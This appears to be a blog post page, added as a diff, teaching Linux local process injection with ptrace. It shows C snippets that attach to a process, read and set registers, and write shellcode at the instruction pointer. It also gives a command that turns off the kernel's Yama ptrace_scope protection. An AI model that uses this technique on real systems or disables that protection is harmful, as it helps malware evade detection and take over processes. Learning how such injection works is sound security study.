@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Linux: Local Process Injection | BinaryChunk’s Blog</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="Linux: Local Process Injection" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Process Injection is a defense evasion technique that is often employed within malware and entails a method of executing arbitrary code in the address space of a separate live process, therefore, allowing access to the process’s memory, system resources and possibly network resources." />
+<meta property="og:description" content="Process Injection is a defense evasion technique that is often employed within malware and entails a method of executing arbitrary code in the address space of a separate live process, therefore, allowing access to the process’s memory, system resources and possibly network resources." />
+<link rel="canonical" href="http://0.0.0.0:4000/2022/08/21/Linux-Process-Injection.html" />
+<meta property="og:url" content="http://0.0.0.0:4000/2022/08/21/Linux-Process-Injection.html" />
+<meta property="og:site_name" content="BinaryChunk’s Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2022-08-21T00:00:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Linux: Local Process Injection" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-08-21T00:00:00+00:00","datePublished":"2022-08-21T00:00:00+00:00","description":"Process Injection is a defense evasion technique that is often employed within malware and entails a method of executing arbitrary code in the address space of a separate live process, therefore, allowing access to the process’s memory, system resources and possibly network resources.","headline":"Linux: Local Process Injection","mainEntityOfPage":{"@type":"WebPage","@id":"http://0.0.0.0:4000/2022/08/21/Linux-Process-Injection.html"},"url":"http://0.0.0.0:4000/2022/08/21/Linux-Process-Injection.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link id="main-stylesheet" rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://0.0.0.0:4000/feed.xml" title="BinaryChunk&apos;s Blog" />
+
+<link rel="icon" href="https://github.githubassets.com/favicons/favicon.svg" type="image/svg+xml">
+<style>
+@font-face {
+  font-family: 'Open Sans';
+  src: url('//fonts.gstatic.com/s/opensans/v44/memSYaGs126MiZpBA-UvWbX2vVnXBbObj2OVZyOOSr4dVJWUgsjZ0B4kaVIGxA.woff2')
+       format('woff2');
+  font-weight: 400;
+  font-style: normal;
+  font-display: swap;
+  font-stretch: 100%;
+}
+
+body {
+  font-family: 'Open Sans', sans-serif;
+  font-size: 11pt;
+}
+</style>
+</head>
+<body><header class="site-header">
+
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">BinaryChunk&#39;s Blog</a>
+      <nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon"></span>
+        </label>
+
+        <div class="nav-items">
+  <a class="nav-item" href="/ctfs/">CTFs</a>
+</div>
+
+      </nav>
+  </div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Linux: Local Process Injection</h1>
+    <div class="post-meta">
+      <time class="dt-published" datetime="2022-08-21T00:00:00+00:00" itemprop="datePublished">
+        Aug 21, 2022
+      </time>
+    </div>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p><strong>Process Injection</strong> is a defense evasion technique that is often employed within malware and entails a method of executing <em>arbitrary code</em> in the address space of a separate live process, therefore, allowing access to the process’s memory, system resources and possibly network resources.</p>
+
+<p>Execution via process injection may also provide a way to evade detection from security products <em>(anti-viruses)</em> because the execution is masked under a legitimate process.</p>
+
+<p>There are other useful purposes of process injection, these include the use of <em>debuggers</em> to hook and debug applications, also some <em>antivirus</em> softwares inject into web browsers to monitor traffic and also block malicious web content.</p>
+
+<p>There are two main ways that code can be injected into a process and these are as follows:</p>
+
+<ol>
+  <li>A <em>legitimate process</em> is started and arbitrary code is injected into the process for execution.</li>
+  <li>Code injection into an already running live remote process possibly a daemon process. <em>(this comes with a disadvantage since we cannot inject into a process owned by another user)</em>.</li>
+</ol>
+
+<p>For this first part, we will simply be introducing the core concepts of the <code class="language-plaintext highlighter-rouge">ptrace</code> syscall and how this can be used to inject shellcode for process injection.</p>
+
+<p>The second part of this <a href="https://mutur4.github.io/2023/10/04/Linux-Remote-Process-Injection.html">series</a> we will be introducing a more advanced process injection technique inspired by the Windows <strong><em>VirtualAllocEx</em></strong> and <strong><em>CreateRemoteThread</em></strong> to inject code after process enumeration.</p>
+
+<h3 id="ptrace-system-call">Ptrace System Call</h3>
+
+<p>The <em>ptrace()</em> system call in Linux, is a system call that provides a means by which one process can control and observe the execution of another process and examine and change its <em>memory</em> and <em>register</em> values. The signature for the system call is as follows:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>long ptrace<span class="o">(</span>enum __ptrace_request request, pid_t pid, void <span class="k">*</span>addr, void <span class="k">*</span>data<span class="o">)</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>The arguments passed to the function are :</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">pid</code> - This is the process identifier of the process in which we will inject malicious code into.</li>
+  <li><code class="language-plaintext highlighter-rouge">ptrace request</code> - These are a group of constants that are accepted by <em>ptrace()</em> used to specify the action to be performed. A list of these requests and their usage are specified in <em>ptrace()’s</em> man page <code class="language-plaintext highlighter-rouge">man ptrace</code>.</li>
+</ul>
+
+<p>The <em>addr</em> and the <em>data</em> arguments are passed to the system call depending on the request type passed to <em>ptrace()</em> , this is because, some requests can ignore or use these values.</p>
+
+<p>To understand how <em>ptrace()</em> can be used to attach to a process, we will write a simple <code class="language-plaintext highlighter-rouge">C</code> application whose code snippet is as follows:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define _GNU_SOURCE
+#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span>
+<span class="cp">#include</span> <span class="cpf">&lt;sys/ptrace.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;sys/wait.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;sys/user.h&gt;</span><span class="cp">
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
+	<span class="n">pid_t</span> <span class="n">pid</span><span class="p">;</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">){</span>
+		<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Usage %s &lt;pid&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+	<span class="p">}</span>
+	<span class="n">pid</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+	<span class="k">if</span><span class="p">(</span><span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_ATTACH</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
+		<span class="n">perror</span><span class="p">(</span><span class="s">"ptrace()"</span><span class="p">);</span>
+		<span class="n">_exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+	<span class="p">}</span>
+	<span class="n">waitpid</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+	<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"* Attached to the process %d </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pid</span><span class="p">);</span>
+	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<blockquote>
+  <p><strong>NOTE</strong>: <em>Using the above code snippet, we will add more code to expand its functionality.</em></p>
+</blockquote>
+
+<p>The above code will simply take the <code class="language-plaintext highlighter-rouge">pid</code> of a process as its command line argz and try to attach to that process; <em>ptrace()</em> takes the request <strong>PTRACE_ATTACH</strong> that ignores the <em>addr</em> and the <em>data</em> arguments, therefore, these values are <strong>NULL</strong>ified. An attachment to a process may fail with a <strong>Permission denied</strong> error because of one of the following reasons:</p>
+<ul>
+  <li>If the process is owned by another user, <em>i.e trying to inject into a root process</em></li>
+  <li>If the process is attached to another process <em>i.e <strong>debugger</strong> or Linux utilities like <strong>ptrace</strong>, <strong>strace</strong> etc..</em></li>
+</ul>
+
+<p>Once the process is succesfully attached, it is stopped by sending a <code class="language-plaintext highlighter-rouge">SIGTRAP</code> signal and <em>waitpid()</em> is used to wait for the delivery of the signal, and after that, we now have full control of the attached process.</p>
+
+<p>The following is the code for the process that we will try to attach to:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+	<span class="n">fprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="s">"*pid %d </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">getpid</span><span class="p">());</span>
+	<span class="n">sleep</span><span class="p">(</span><span class="mi">1000</span><span class="p">);</span>
+	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>When executed the above code returns its process identifier <em>(pid)</em> and <em>sleep’s</em> for <code class="language-plaintext highlighter-rouge">1000</code> seconds giving use time to attach to it. Running our injector application above, will attach to this process giving use full control of the process’ resources.</p>
+
+<h3 id="controllling-registers">Controllling Registers</h3>
+
+<p>The request <code class="language-plaintext highlighter-rouge">PTRACE_GETREGS</code>, allows us to access all the registers in the attached process. The <em>user_regs_struct</em> structure from the <code class="language-plaintext highlighter-rouge">user.h</code> header is used to store these registers and this is passed as the third argument <em>data</em>.</p>
+
+<p>To this moment, we have only attached to a process; we can now access its register values. These are the registers at the point when the <code class="language-plaintext highlighter-rouge">SIGTRAP</code> was received.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="n">fprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="s">"* Getting Registers </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pid</span><span class="p">);</span>
+	
+	<span class="k">struct</span> <span class="n">user_regs_struct</span> <span class="n">regs</span><span class="p">;</span>
+
+	<span class="k">if</span> <span class="p">(</span><span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_GETREGS</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">regs</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
+		<span class="n">perror</span><span class="p">(</span><span class="s">"PTRACE_GETREGS"</span><span class="p">);</span>
+		<span class="n">_exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+	<span class="p">}</span>
+	
+	<span class="n">fprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="s">"(rip) %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">regs</span><span class="p">.</span><span class="n">rip</span><span class="p">);</span>
+	<span class="n">fprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="s">"(rsp) %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">regs</span><span class="p">.</span><span class="n">rsp</span><span class="p">);</span>
+	<span class="n">fprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="s">"(rbp) %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">regs</span><span class="p">.</span><span class="n">rbp</span><span class="p">);</span>
+
+</code></pre></div></div>
+<p>The values of all the registers in the process are captured and can now be accessed from the above mentioned <code class="language-plaintext highlighter-rouge">user_regs_struct</code> variable.</p>
+
+<p>The <code class="language-plaintext highlighter-rouge">PTRACE_SETREGS</code> request, allows us to set the value of these registers to any value of our choice. This is where our control comes in handly since we can set the value of <code class="language-plaintext highlighter-rouge">RIP</code> to point to the address of our injected code and return execution back to the process. There are a couple of places where code can be injected:</p>
+
+<ol>
+  <li>The code can be inserted in the current instruction that is being executed, this is the current address held by the <code class="language-plaintext highlighter-rouge">rip</code> register since this region will obviously be executable.</li>
+  <li>Code can be injected on the stack and execution redirected there, this is always a disavantage because most stacks are not executable as a protection against stack buffer overflow via shellcode injection.</li>
+  <li>Code an also be injected in any memory region mapped to be executable, this technique will be used in the next post.</li>
+  <li>Code injection in the executable’s <em>code cave</em>. A code cave can be defined as a region with a contigous series of unused or NULL bytes that exists when a program is loaded in memory, this happens because of page aligments.</li>
+</ol>
+
+<p>For simplicity, we will inject code in the current address held by the <code class="language-plaintext highlighter-rouge">rip</code> register. The following is a block of code that will be used to inject malicious code into a chosen memory address.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">inject_code</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="n">payload</span><span class="p">,</span> <span class="n">pid_t</span> <span class="n">pid</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="n">dest</span><span class="p">){</span>
+        <span class="k">for</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">strlen</span><span class="p">(</span><span class="n">SHELLCODE</span><span class="p">);</span> <span class="n">i</span><span class="o">+=</span> <span class="mi">8</span><span class="p">,</span> <span class="n">payload</span><span class="o">++</span><span class="p">,</span> <span class="n">dest</span><span class="o">++</span><span class="p">){</span>
+                <span class="k">if</span> <span class="p">(</span><span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_POKETEXT</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="n">dest</span><span class="p">,</span> <span class="o">*</span><span class="n">payload</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
+                        <span class="n">perror</span><span class="p">(</span><span class="s">"POKTEXT"</span><span class="p">);</span>
+                        <span class="n">_exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+                <span class="p">}</span>
+        <span class="p">}</span> 
+<span class="p">}</span>
+
+</code></pre></div></div>
+<p>The ptrace request <code class="language-plaintext highlighter-rouge">PTRACE_POKETEXT</code> will take the <code class="language-plaintext highlighter-rouge">addr</code> and the <code class="language-plaintext highlighter-rouge">data</code> pointers as arguments and whatever is in <code class="language-plaintext highlighter-rouge">data</code> will be copied to <code class="language-plaintext highlighter-rouge">addr</code>.
+Since this a 64-bit application we increment the iterator with 8 bytes, since with each copy, 8-bytes of data is copied.</p>
+
+<p>The <code class="language-plaintext highlighter-rouge">PTRACE_PEEKTEXT</code> request does the opposite (reading data) and can be used to read data from the injected process.</p>
+
+<h3 id="code-execution">Code Execution</h3>
+
+<p>Since the current address where <code class="language-plaintext highlighter-rouge">rip</code> was pointing to is overwritten with our malicious code we now have to return registers back to the process. As stated above the request <code class="language-plaintext highlighter-rouge">PTRACE_SETREGS</code> is used. This takes the <code class="language-plaintext highlighter-rouge">data</code> argument which is the address of the <code class="language-plaintext highlighter-rouge">user_regs_struct</code> structure.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="k">struct</span> <span class="n">user_regs_struct</span> <span class="n">new_regs</span><span class="p">;</span>
+        
+	<span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">new_regs</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">regs</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">user_regs_struct</span><span class="p">));</span>
+        <span class="n">new_regs</span><span class="p">.</span><span class="n">rip</span> <span class="o">+=</span> <span class="mi">2</span><span class="p">;</span>
+
+        <span class="k">if</span><span class="p">(</span><span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_SETREGS</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">new_regs</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
+                <span class="n">perror</span><span class="p">(</span><span class="s">"PTRACE_SETREGS"</span><span class="p">);</span>
+                <span class="n">_exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="k">if</span><span class="p">(</span><span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_CONT</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
+                <span class="n">perror</span><span class="p">(</span><span class="s">"PTRACE_DETACH"</span><span class="p">);</span>
+                <span class="n">_exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="n">fprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="s">"* successfully injected code into the process"</span><span class="p">);</span>
+</code></pre></div></div>
+<p>The <code class="language-plaintext highlighter-rouge">PTRACE_CONT</code> request will resume the process from its saved stated, this will also subtract 2 bytes from the instruction pointer, therefore we add 2 bytes <em>(idk the reason)</em> to exactly point the instruction pointer to the address of our injected shellcode.The <code class="language-plaintext highlighter-rouge">PTRACE_DETACH</code> request will resume the execution of the paused process to execute the injected code. The complete code can be located at <a href="https://github.com/mutur4/Linux-Malware/blob/main/Process.Injection/simple-ptrace-injection.c">inject.c</a>.</p>
+
+<p>The injected code is executed successfully but the main disadvantage is after malicious code execution, that process will also terminate <em>(the process we injected into…)</em></p>
+
+<h3 id="conclusion">Conclusion</h3>
+
+<p>This was a simple introduction to process injection, where we injected shellcode into a live process <em>(that we basically started/initiated)</em> <strong>boring right!!</strong> :squinting_face_with_tongue:. In the next part, we will look at more advanced process injection techniques where code injection will not affect the execution of another process by introducing <em>‘remote threading’</em>.</p>
+
+<p>There is one <strong>shortcoming</strong> that prevents injection via the <code class="language-plaintext highlighter-rouge">ptrace</code> syscall. The kernel might be configured to prevent any process from using <code class="language-plaintext highlighter-rouge">ptrace</code> on another process it did not create. This can be turned off using the following bash commands.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo </span>0 | <span class="nb">sudo tee</span> /proc/sys/kernel/yama/ptrace_scope
+</code></pre></div></div>
+
+<h3 id="references">References</h3>
+
+<ul>
+  <li>[1] https://papers.vx-underground.org/papers/Linux/Process%20Injection/Infecting%20Running%20Processes.pdf</li>
+</ul>
+
+
+  </div>
+
+  <a class="u-url" href="/2022/08/21/Linux-Process-Injection.html" hidden></a>
+</article>
+
+      </div>
+    </main><link id="fa-stylesheet" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@latest/css/all.min.css">
+
+<footer class="site-footer h-card">
+  <data class="u-url" value="/"></data>
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col">
+      </div>
+      <div class="footer-col">
+        <p></p>
+      </div>
+    </div>
+
+    <div class="social-links"><ul class="social-media-list"><li>
+    <a rel="me" href="https://x.com/BinaryChunk" target="_blank" title="BinaryChunk on X">
+      <span class="grey fa-brands fa-x-twitter fa-lg"></span>
+    </a>
+  </li><li>
+    <a rel="me" href="https://github.com/mutur4" target="_blank" title="BinaryChunk on Github">
+      <span class="grey fa-brands fa-github fa-lg"></span>
+    </a>
+  </li>
+</ul>
+</div>
+
+  </div>
+
+</footer>
+
+</body>
+
+</html>
